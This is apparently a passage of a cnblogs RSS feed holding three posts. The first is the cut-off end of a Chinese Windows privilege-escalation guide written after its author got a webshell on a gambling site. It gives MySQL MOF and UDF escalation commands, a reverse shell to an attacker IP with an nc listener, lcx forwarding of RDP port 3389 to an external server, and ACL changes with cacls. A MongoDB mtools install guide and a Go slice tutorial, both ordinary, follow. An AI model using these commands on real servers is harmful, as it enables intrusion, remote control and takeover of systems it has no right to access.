&lt;/pre&gt;
&lt;h4 id=&quot;三mof提权&quot;&gt;三，mof提权&lt;/h4&gt;
&lt;pre&gt;
&lt;code&gt;mof提权原理：
第一种方法：
上传mof.php,输入相关信息，执行命令，提权。
第二种方法：
上传x.mof文件，使用select命令导出到正确的位置。
select load_file('C:/php/APMServ5.2.6/www/htdocs/1.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'
允许外部地址使用root用户连接的sql语句：
Grant all privileges on *.* to 'root'@'%' IDENTIFIED BY &quot;root账户密码&quot; with grant option;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;四反链端口提权反弹shell&quot;&gt;四，反链端口提权（反弹shell）&lt;/h4&gt;
&lt;p&gt;反链端口提权原理：可以使用udf提权的大马进行操作。&lt;br/&gt;1，利用mysql客户端工具连接mysql服务器，然后执行下面的操作。&lt;br/&gt;执行命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;mysql.exe -h 192.168.174.151 -uroot -p
enter password:
mysql&amp;gt;\. C:\mysql.txt
mysql&amp;gt;select backshell(&quot;YourIP&quot;,端口);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;2，本地监听你反弹的端口：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;nc.exe -v -l -p 端口&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;成功后，你可以获得一个system权限的cmdshell，其实这个也是利用udf提权，即使用udf提权的大马进行反弹shell提权。&lt;/p&gt;
&lt;h4 id=&quot;五内网端口转发&quot;&gt;五，内网端口转发：&lt;/h4&gt;
&lt;pre&gt;
&lt;code&gt;1，内网端口转发常用操作。

内网主机输入命令：该外网ip为黑客的某台服务器。
lcx.exe -slave 外网ip 外网端口 内网ip 内网端口
lcx.exe -slave 200.1.1.1 1111 192.168.1.2 3389

外网主机输入命令：
lcx.exe -listen 1111 1311&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;开启3389常用方法&quot;&gt;开启3389常用方法&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;使用批处理文件开启3389&lt;/li&gt;
&lt;li&gt;使用sql语句开启3389&lt;/li&gt;
&lt;li&gt;使用exe开启3389&lt;/li&gt;
&lt;li&gt;使用vb开启3389&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;windows常用权限提升命令&quot;&gt;windows常用权限提升命令&lt;/h2&gt;
&lt;pre&gt;
&lt;code&gt;常用命令：
type E:\wwwroot\web.config 查看文件内容

cacls命令：

/T            更改当前目录及其所有子目录中指定文件的 ACL。
/E            编辑 ACL 而不替换。
/C            在出现拒绝访问错误时继续。
/G user:perm  赋予指定用户访问权限。Perm 可以是: R读取，W写入，C更改(写入)，F完全控制。
/R user       撤销指定用户的访问权限(仅在与 /E 一起使用时合法)。

cacls C:\wwwroot\1.html /t /e /c /g v01cano:f

要修改一个文件权限的必要条件：
有user组的完全控制权限，cmd权限。&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Thu, 24 Jan 2019 15:00:00 +0000</pubDate>
<dc:creator>v01cano</dc:creator>
<og:description>windows提权 0，起因，由于前几天拿了一个菠菜站的webshell，但是只有iis权限，执行无法创建用户等操作，更无法对整个服务器进行控制了，于是此时便需要提权了，对于一个刚刚入门的小白来说，此</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/v01cano/p/10317458.html</dc:identifier>
</item>
<item>
<title>推荐一款关于MongoDB日志分析的工具--Mtools - 东山絮柳仔</title>
<link>http://www.cnblogs.com/xuliuzai/p/10317421.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xuliuzai/p/10317421.html</guid>
<description>&lt;h2&gt;一. 需求背景&lt;/h2&gt;
&lt;p&gt;MongoDB数据库的强大的文档模型使其成为处理数据的最佳方式。文档适用于广泛的流行数据模型，支持各种各样的场景。文档模型可以包含键值、关系数据集和图形数据集，当然，还可以包含父子关系、列表/数组以及其他层次关系，它们比传统的关系型数据库技术（表格）具有更大的灵活性。由于文档模型与主流面向对象编程语言中的对象直接对应，因此开发人员可以根据现实世界中实体之间的自然关系存储和组织数据，从而将重点放在以最有意义的方式构建应用程序上，而不是围绕其数据库的局限性开展工作。因此，使用文档模型显著提高了开发人员的生产效率，使组织机构能够更快地进行创新。MongoDB CEO 兼总裁Dev Ittycheria称之为： 文档即未来。&lt;/p&gt;
&lt;p&gt;但是MongoDB通用的监控工具有限，其中又有一部分还是要收费的,通过工具 Percona Monitoring and Management 进行监控，是个不错的选择。但在慢查询收集方面，需要开启Profiling，对性能方面会有一些侵害，另外，更细粒度的监控项维护起来也不容易。如果不想不开启Profiling，我们还可以通过收集分析mongodb的运行log来来进行性能监控，并且通过运行日志还可以获取更多的运行状态相关的信息。&lt;/p&gt;
&lt;p&gt;今天介绍的就是一款专门用来读取、分析MongoDB运行日志的工具--Mtools。&lt;/p&gt;
&lt;h2&gt; 二. Mtools 的介绍&lt;/h2&gt;
&lt;p&gt; Mtools的工具包和功能可以通过下面的List来描述。&lt;/p&gt;
&lt;table border=&quot;0&quot;&gt;&lt;tbody readability=&quot;32&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;工具包&lt;/td&gt;
&lt;td&gt;工具&lt;/td&gt;
&lt;td&gt;功能概览&lt;/td&gt;
&lt;td&gt;实现功能&lt;/td&gt;
&lt;td&gt;执行的命令（案例）&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;6&quot;&gt;&lt;td rowspan=&quot;13&quot;&gt;mtools&lt;/td&gt;
&lt;td rowspan=&quot;4&quot;&gt;Mlogfilter&lt;/td&gt;
&lt;td rowspan=&quot;4&quot;&gt;mlogfileter可以简单理解为日志的过滤器&lt;/td&gt;
&lt;td&gt;列出日志文件中所有的slow log(以json格式输出) &lt;/td&gt;
&lt;td&gt;mlogfilter &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt; --slow 100 --json&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;通--from 和 --to 参数限定搜索范围&lt;/td&gt;
&lt;td&gt;mlogfilter &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt; --slow 100 --from 2018-12-10T09:32:26 --to 2018-12-10T09:58:26&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;上面命令限定范围 也通过 to 来指定时间段，例如监控10min内的数据&lt;/td&gt;
&lt;td&gt;mlogfilter &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt;  --from 2018-12-10T09:32:26 --to +10min&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;通过mlogfilter查询日志中某个表的slow log(超过100ms的)&lt;/td&gt;
&lt;td&gt;mlogfilter --namespace xxx.xx --slow 100 &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;8&quot;&gt;&lt;td rowspan=&quot;4&quot;&gt;mloginfo&lt;/td&gt;
&lt;td rowspan=&quot;4&quot;&gt;mloginfo可以过滤总结出slow query的情况,以及为日志中各类最常常出现情况进行统计&lt;/td&gt;
&lt;td&gt;通过mloginfo统计日志中connections的来源情况&lt;/td&gt;
&lt;td&gt;mloginfo &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt; --connections&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;通过mloginfo查看日志中所记录的复制集状态变更(如果有的话)&lt;/td&gt;
&lt;td&gt;mloginfo &lt;strong&gt;&lt;em&gt;mongod.log&lt;/em&gt;&lt;/strong&gt; --rsstate&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;通过mloginfo统计查看日志中慢查询的分类&lt;/td&gt;
&lt;td&gt;mloginfo --queries &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;通过mloginfo统计日志中各类信息的distinct&lt;/td&gt;
&lt;td&gt;mloginfo &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt; --distinct&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;6&quot;&gt;&lt;td rowspan=&quot;5&quot;&gt;mplotqueries&lt;/td&gt;
&lt;td rowspan=&quot;5&quot;&gt;用不同类型的图将日志文件可视化(需要安装matplotlib)&lt;/td&gt;
&lt;td&gt;通过mplotqueries进行慢查询散点分布图绘制&lt;/td&gt;
&lt;td&gt;mplotqueries &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt; --output-file slow01-2.png&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;5&quot;&gt;&lt;td&gt;通过mplotqueries进行慢查询散点分布图绘制,且只返回前10个&lt;/td&gt;
&lt;td&gt;mplotqueries &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt; --output-file slow01-4.png --logscale --group-limit 10&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;仅看日志中某一个表的慢查询散点分布情况&lt;/td&gt;
&lt;td&gt;mlogfilter &lt;strong&gt;&lt;em&gt;mongod.log&lt;/em&gt;&lt;/strong&gt; --namespace xx.xxx |mplotqueries --output-file slow01-5.png&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;通过mplotqueries来对日志中的慢查询进行操作类型分布&lt;/td&gt;
&lt;td&gt;mplotqueries &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt; --group operation --output-file slow01-6.png&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;5&quot;&gt;&lt;td&gt;查看每小时的insert情况&lt;/td&gt;
&lt;td&gt;mlogfilter &lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt; --operation insert | mplotqueries --type histogram --bucketsize 3600 --output-file 01-11.png&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;注：&lt;em&gt;&lt;strong&gt;mongod.log&lt;/strong&gt;&lt;/em&gt; 是MonogoDB 运行时产生的日志文件名字，也可以是其它日志文件名。 &lt;/p&gt;
&lt;h2&gt;三. Mtools安装的详细步骤&lt;/h2&gt;
&lt;p&gt;很多同学抱怨安装比较麻烦，错误很多，在这儿，把安装的详细步骤梳理如下。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 1&lt;/strong&gt;  下载pip程序包&lt;/p&gt;
&lt;p&gt;wget &quot;https://pypi.python.org/packages/source/p/pip/pip-1.5.4.tar.gz#md5=834b2904f92d46aaa333267fb1c922bb&quot;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124104550782-1722273415.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 2 &lt;/strong&gt;解析下载的文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124104634641-924681569.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; Step 3&lt;/strong&gt; 安装 python setup.py install&lt;/p&gt;
&lt;p&gt; 此时报错，提示错误信息如截图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124101951994-746424701.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 4&lt;/strong&gt;  针对上述错误，需安装setuptools,python下的setuptools。此程序包带有一个easy_install的工具,在安装python的每三方模块、工具时很有用,。&lt;/p&gt;
&lt;p&gt;下载 &lt;/p&gt;
&lt;p&gt;wget --no-check-certificate https://pypi.python.org/packages/source/s/setuptools/setuptools-12.0.3.tar.gz#md5=f07e4b0f4c1c9368fcd980d888b29a65&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124103416217-1913174561.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;解压 &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124103548999-455574993.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 5&lt;/strong&gt; 转到解析后的文档中，再次安装 python setup.py install&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124103941785-139125371.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;安装成功。&lt;/p&gt;
&lt;p&gt; &lt;strong&gt;Step 6&lt;/strong&gt; 安装 yum -y install python-pip&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124111433365-1842409005.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果提示错误 &lt;/p&gt;
&lt;p&gt;No package python-pip available.&lt;/p&gt;
&lt;p&gt;Error: Nothing to do&lt;/p&gt;
&lt;p&gt;请看后面的附注&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 7&lt;/strong&gt;  安装  mtools&lt;/p&gt;
&lt;p&gt; 执行命令  pip install mtools&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124111724931-1643139040.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 8&lt;/strong&gt; 安装效果验证&lt;/p&gt;
&lt;p&gt;使用其中的mlogfileter命令，查看日志超过100ms的慢查询。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124135100302-1481739612.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;通过mloginfo统计日志中connections的来源情况&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124135006583-138093831.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 验证工具安装OK。&lt;/p&gt;
&lt;p&gt;安装后，工具包所在的文档位于 /usr/lib/python2.7/site-packages/mtools 下 （自动生成） &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124171705313-1223462763.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;h2&gt; 四 附录&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;A：解决 No package python-pip available的问题&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;此错误的原因主要是没有安装epel。索引， 运行以下命令，安装epel&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124111009102-784168510.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 安装 epel-release后，再次安装 python-pip，不再报错。&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124111104023-149544476.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; B：运行 mplotqueries 工具 需安装 python-matplotlib 包，和修改mplotqueries.py文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;否则报错，具体信息如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124171754722-915663553.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;安装命令 yum install python-matplotlib&lt;/p&gt;
&lt;p&gt;到此，还没结束，还会报错，我们还需要修改 /usr/lib/python2.7/site-packages/mtools/mplotqueries/mplotqueries.py 执行文件。&lt;/p&gt;
&lt;p&gt;添加 以下指令&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
import matplotlib as mpl
mpl.use('Agg')
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;添加前&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124172133382-1890963623.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 添加后&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124172230796-26845790.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;再次执行 mplotqueries 命令后，看出生成了我们想要的 01-2.png 统计文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780228/201901/780228-20190124173735669-549177945.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;本文版权归作者所有，未经作者同意不得转载&lt;/strong&gt;&lt;strong&gt;,&lt;/strong&gt;&lt;strong&gt;谢谢配合！！！&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 24 Jan 2019 14:49:00 +0000</pubDate>
<dc:creator>东山絮柳仔</dc:creator>
<og:description>一. 需求背景 MongoDB数据库的强大的文档模型使其成为处理数据的最佳方式。文档适用于广泛的流行数据模型，支持各种各样的场景。文档模型可以包含键值、关系数据集和图形数据集，当然，还可以包含父子关系</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xuliuzai/p/10317421.html</dc:identifier>
</item>
<item>
<title>【Go】slice的一些使用技巧 - 戚银</title>
<link>http://www.cnblogs.com/thinkeridea/p/10317417.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/thinkeridea/p/10317417.html</guid>
<description>&lt;p&gt;原文链接：&lt;a href=&quot;https://blog.thinkeridea.com/201901/go/slice_de_yi_xie_shi_yong_ji_qiao.html&quot; class=&quot;uri&quot;&gt;https://blog.thinkeridea.com/201901/go/slice_de_yi_xie_shi_yong_ji_qiao.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;slice&lt;/code&gt; 是 &lt;code&gt;Go&lt;/code&gt; 语言十分重要的数据类型，它承载着很多使命，从语言层面来看是 &lt;code&gt;Go&lt;/code&gt; 语言的内置数据类型，从数据结构来看是动态长度的顺序链表，由于 &lt;code&gt;Go&lt;/code&gt; 不能直接操作内存（通过系统调用可以实现，但是语言本身并不支持），往往 &lt;code&gt;slice&lt;/code&gt; 也可以用来帮助开发者申请大块内存实现缓冲、缓存等功能。&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;Go&lt;/code&gt; 语言项目中大量的使用 &lt;code&gt;slice&lt;/code&gt;, 我总结三年来对 &lt;code&gt;slice&lt;/code&gt; 的一些操作技巧，以方便可以高效的使用 &lt;code&gt;slice&lt;/code&gt;， 并使用 &lt;code&gt;slice&lt;/code&gt; 解决一些棘手的问题。&lt;/p&gt;
&lt;h2 id=&quot;slice-的基本操作&quot;&gt;slice 的基本操作&lt;/h2&gt;
&lt;p&gt;先熟悉一些 &lt;code&gt;slice&lt;/code&gt; 的基本的操作, 对最常规的 &lt;code&gt;:&lt;/code&gt; 操作就可玩出很多花样。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;s=ss[:]&lt;/code&gt; 引用一个切片或数组&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s=s[:0]&lt;/code&gt; 清空切片&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s=s[:10]&lt;/code&gt; &lt;code&gt;s=s[10:]&lt;/code&gt; &lt;code&gt;s=s[10:20]&lt;/code&gt; 截取接片&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s=ss[0:10:20]&lt;/code&gt; 从切片或数组引用指定长度和容量的切片&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;下标索引操作的一些误区 &lt;code&gt;s[i:l:c]&lt;/code&gt; &lt;code&gt;i&lt;/code&gt; 是起始偏移的起始位置，&lt;code&gt;l&lt;/code&gt; 是起始偏移的长度结束位置， &lt;code&gt;l-i&lt;/code&gt; 就是新 &lt;code&gt;slice&lt;/code&gt; 的长度， &lt;code&gt;c&lt;/code&gt; 是起始偏移的容量结束位置，&lt;code&gt;c-i&lt;/code&gt; 就是新 &lt;code&gt;slice&lt;/code&gt; 的容量。其中 &lt;code&gt;i&lt;/code&gt; 、&lt;code&gt;l&lt;/code&gt; 、&lt;code&gt;c&lt;/code&gt; 并不是当前 &lt;code&gt;slice&lt;/code&gt; 的索引，而是引用底层数组相对当前 &lt;code&gt;slice&lt;/code&gt; 起始位置的偏移量，所以是可超出当前 &lt;code&gt;slice&lt;/code&gt; 的长度的， 但不能超出当前 &lt;code&gt;slice&lt;/code&gt; 的容量，如下操作是合法的：&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;package main

import (
    &quot;fmt&quot;
)

func main() {
    s := make([]int, 100)
    s[20] = 100
    s1 := s[10:10]
    s2 := s1[10:20]
    fmt.Println(s1)
    fmt.Println(s2)
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其中 &lt;code&gt;s1&lt;/code&gt; 是 &lt;code&gt;[]&lt;/code&gt;；&lt;code&gt;s2&lt;/code&gt; 是 &lt;code&gt;[100 0 0 0 0 0 0 0 0 0]&lt;/code&gt;, 这里并不会发生下标越界的情况，一个更好的例子在 &lt;a href=&quot;http://www.cnblogs.com/thinkeridea/p/10317417.html#csv-reader-中的一个例子&quot;&gt;csv reader 中的一个例子&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;创建 slice&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;创建切片的方法有很多，下面罗列一些常规的：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;var s []int&lt;/code&gt; 创建 nil切片&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s := make([]int, 0, 0)&lt;/code&gt; 、 &lt;code&gt;s=[]int{}&lt;/code&gt; 创建无容量空切片&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s:= make([]int, 0, 100)&lt;/code&gt; 创建有容量空切片&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s:=make([]int, 100)&lt;/code&gt; 创建零值切片&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s:=array[:]&lt;/code&gt; 引用数组创建切片&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;内置函数&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;len(s)&lt;/code&gt; 获取切片的长度&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cap(s)&lt;/code&gt; 获取切片的容量&lt;/li&gt;
&lt;li&gt;&lt;code&gt;append(s, ...)&lt;/code&gt; 向切片追加内容&lt;/li&gt;
&lt;li&gt;&lt;code&gt;copy(s, s1)&lt;/code&gt; 向切片拷贝内容&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;一个缓冲的简单示例&quot;&gt;一个缓冲的简单示例&lt;/h2&gt;
&lt;p&gt;遇到过很多拼接字符串的方法，各种各样的都有 &lt;code&gt;fmt&lt;/code&gt; &lt;code&gt;builder&lt;/code&gt; &lt;code&gt;buffer&lt;/code&gt; &lt;code&gt;+&lt;/code&gt; 等等，实际上 &lt;code&gt;builder&lt;/code&gt; 和 &lt;code&gt;buffer&lt;/code&gt; 都是使用 &lt;code&gt;[]byte&lt;/code&gt; 的切片作为缓冲来实现的，&lt;code&gt;fmt&lt;/code&gt; 往往性能最差，原因是它主要功能不是连接字符串而是格式化数据会用到反射等等操作。&lt;code&gt;+&lt;/code&gt; 操作在大量拼接时性能也是很差， 不过小字符串少量拼接效果很理想，&lt;code&gt;builder&lt;/code&gt; 往往性能不如 &lt;code&gt;buffer&lt;/code&gt; 特别是在较短字符串拼接上，实际 &lt;code&gt;builder&lt;/code&gt; 和 &lt;code&gt;buffer&lt;/code&gt; 实现原理非常类似，&lt;code&gt;builder&lt;/code&gt; 在转成字符串时使用了 &lt;code&gt;unsafe&lt;/code&gt; 减少了一次内存分配，因为小字符串因为扩容机制不如 &lt;code&gt;buffer&lt;/code&gt; 灵活，所以性能有所不如，大字符串降低一次大的内存分配就显得很明显了。&lt;/p&gt;
&lt;p&gt;经常遇到一个需求就是拼接 &lt;code&gt;[]int&lt;/code&gt; 中个各个元素，很多种实现都有人用，都是需要遍历转换 &lt;code&gt;int&lt;/code&gt; 到 &lt;code&gt;string&lt;/code&gt;，但是拼接方法千奇百怪，以下提供两种方法对比（&lt;a href=&quot;https://github.com/thinkeridea/example/blob/master/slice/slice_int_to_string.go&quot;&gt;源码在GitHub&lt;/a&gt;）。&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;package slice

import (
    &quot;strconv&quot;
    &quot;unsafe&quot;
)

func SliceInt2String1(s []int) string {
    if len(s) &amp;lt; 1 {
        return &quot;&quot;
    }

    ss := strconv.Itoa(s[0])
    for i := 1; i &amp;lt; len(s); i++ {
        ss += &quot;,&quot; + strconv.Itoa(s[i])
    }

    return ss
}

func SliceInt2String2(s []int) string {
    if len(s) &amp;lt; 1 {
        return &quot;&quot;
    }

    b := make([]byte, 0, 256)
    b = append(b, strconv.Itoa(s[0])...)
    for i := 1; i &amp;lt; len(s); i++ {
        b = append(b, ',')
        b = append(b, strconv.Itoa(s[i])...)
    }

    return string(b)
}

func SliceInt2String3(s []int) string {
    if len(s) &amp;lt; 1 {
        return &quot;&quot;
    }

    b := make([]byte, 0, 256)
    b = append(b, strconv.Itoa(s[0])...)
    for i := 1; i &amp;lt; len(s); i++ {
        b = append(b, ',')
        b = append(b, strconv.Itoa(s[i])...)
    }

    return *(*string)(unsafe.Pointer(&amp;amp;b))
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;SliceInt2String1&lt;/code&gt; 使用原始的 &lt;code&gt;+&lt;/code&gt; 操作，因为是较小的字符串拼接，使用 &lt;code&gt;+&lt;/code&gt; 主要是因为在小字符串拼接性能优于其它几种方法，&lt;code&gt;SliceInt2String2&lt;/code&gt; 与 &lt;code&gt;SliceInt2String3&lt;/code&gt; 都使用了一个 &lt;code&gt;256&lt;/code&gt; 容量的 &lt;code&gt;[]byte&lt;/code&gt; 作为缓冲， 唯一的区别是在返回时一个使用 &lt;code&gt;string&lt;/code&gt; 转换类型，一个使用 &lt;code&gt;unsafe&lt;/code&gt; 转换类型。&lt;/p&gt;
&lt;p&gt;写了一个性能测试（&lt;a href=&quot;https://github.com/thinkeridea/example/blob/master/slice/slice_int_to_string_test.go&quot;&gt;源码在GitHub&lt;/a&gt;），看一下效果吧:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;goos: darwin
goarch: amd64
pkg: github.com/thinkeridea/example/slice
BenchmarkSliceInt2String1-8      3000000           461 ns/op         144 B/op          9 allocs/op
BenchmarkSliceInt2String2-8     20000000           117 ns/op          32 B/op          1 allocs/op
BenchmarkSliceInt2String3-8     10000000           144 ns/op         256 B/op          1 allocs/op
PASS
ok      github.com/thinkeridea/example/slice    5.928s&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;明显可以看得出 &lt;code&gt;SliceInt2String2&lt;/code&gt; 的性能是 &lt;code&gt;SliceInt2String1&lt;/code&gt; 7倍左右，提升很明显，&lt;code&gt;SliceInt2String2&lt;/code&gt; 与 &lt;code&gt;SliceInt2String3&lt;/code&gt; 差异很小，主要是因为使用 &lt;code&gt;unsafe&lt;/code&gt; 转换类型导致大内存无法释放，实际这个测试中连接字符串只需要 &lt;code&gt;32&lt;/code&gt; 个字节，使用 &lt;code&gt;unsafe&lt;/code&gt; 却导致 &lt;code&gt;256&lt;/code&gt; 个字节无法被释放，这也正是 &lt;code&gt;builder&lt;/code&gt; 和 &lt;code&gt;buffer&lt;/code&gt; 的差别，所以小字符串拼接 &lt;code&gt;buffer&lt;/code&gt; 性能往往更好。在这里简单的通过 &lt;code&gt;[]byte&lt;/code&gt; 减少内存分配次数来实现缓冲。&lt;/p&gt;
&lt;p&gt;如果连续拼接一组这样的操作，比如输入 &lt;code&gt;[][]int&lt;/code&gt;, 输出 &lt;code&gt;[]string&lt;/code&gt; （&lt;a href=&quot;https://github.com/thinkeridea/example/blob/master/slice/slice_int_to_string.go#L52&quot;&gt;源码在GitHub&lt;/a&gt;）：&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;package slice

import (
    &quot;strconv&quot;
    &quot;unsafe&quot;
)

func SliceInt2String4(s [][]int) []string {
    res := make([]string, len(s))
    for i, v := range s {
        if len(v) &amp;lt; 1 {
            res[i] = &quot;&quot;
            continue
        }

        res[i] += strconv.Itoa(v[0])
        for j := 1; j &amp;lt; len(v); j++ {
            res[i] += &quot;,&quot; + strconv.Itoa(v[j])
        }
    }

    return res
}

func SliceInt2String5(s [][]int) []string {
    res := make([]string, len(s))
    b := make([]byte, 0, 256)
    for i, v := range s {
        if len(v) &amp;lt; 1 {
            res[i] = &quot;&quot;
            continue
        }

        b = b[:0]
        b = append(b, strconv.Itoa(v[0])...)
        for j := 1; j &amp;lt; len(v); j++ {
            b = append(b, ',')
            b = append(b, strconv.Itoa(v[j])...)
        }

